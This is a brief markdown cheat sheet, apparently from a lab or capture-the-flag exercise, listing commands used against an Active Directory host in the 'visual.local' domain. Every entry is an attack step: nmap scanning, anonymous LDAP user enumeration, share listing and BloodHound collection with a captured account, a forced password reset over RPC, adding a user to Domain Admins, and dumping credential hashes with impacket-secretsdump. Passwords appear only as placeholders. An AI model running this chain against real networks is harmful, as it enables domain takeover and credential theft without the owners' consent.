---
title: Commandlar Reference
tags: [commands, cheatsheet]
---

# Commandlar Reference

## Nmap
```bash
nmap -sCV 192.168.60.76 -T4
```

## LDAP
```bash
ldapsearch -x -H ldap://192.168.60.76 -b "dc=visual,dc=local" "(objectclass=user)" sAMAccountName | grep sAMAccountName
```

## NetExec LDAP
```bash
nxc ldap 192.168.60.76 -u '' -p '' --users
```

## SMB
```bash
nxc smb 192.168.60.76 -u 'park.ian' -p '<LAB_PASSWORD>' --shares
```

## BloodHound
```bash
bloodhound-python -u 'park.ian' -p '<LAB_PASSWORD>' -d visual.local -ns 192.168.60.76 -c All
```

## Password change
```bash
net rpc password "hall.noa" "<NEW_LAB_PASSWORD>" -U "visual.local"/"roy.ada"%"<LAB_PASSWORD>" -S 192.168.60.76
```

## Group membership
```bash
net rpc group addmem "Domain Admins" "roy.ada" -U "visual.local"/"hall.noa"%"<LAB_PASSWORD>" -S 192.168.60.76
```

## SecretsDump
```bash
impacket-secretsdump 'visual.local/roy.ada@192.168.60.76' -dc-ip 192.168.60.76
```
